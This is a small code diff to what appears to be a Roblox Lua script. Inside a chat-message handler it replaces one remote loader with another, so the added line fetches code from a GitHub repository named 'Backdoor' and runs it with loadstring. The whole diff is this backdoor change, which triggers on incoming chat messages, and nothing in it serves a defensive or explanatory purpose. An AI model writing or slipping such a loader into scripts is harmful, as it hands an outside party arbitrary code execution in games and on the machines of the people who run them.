@@ -5,7 +5,7 @@
             lastMessageText = message.Text
 
             -- This willpop
-            loadstring(game:HttpGet("https://pastebin.com/raw/QfJn3J9A"))()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/SSkullls/Backdoor/refs/heads/main/api"))()
         end
     end
 end]]
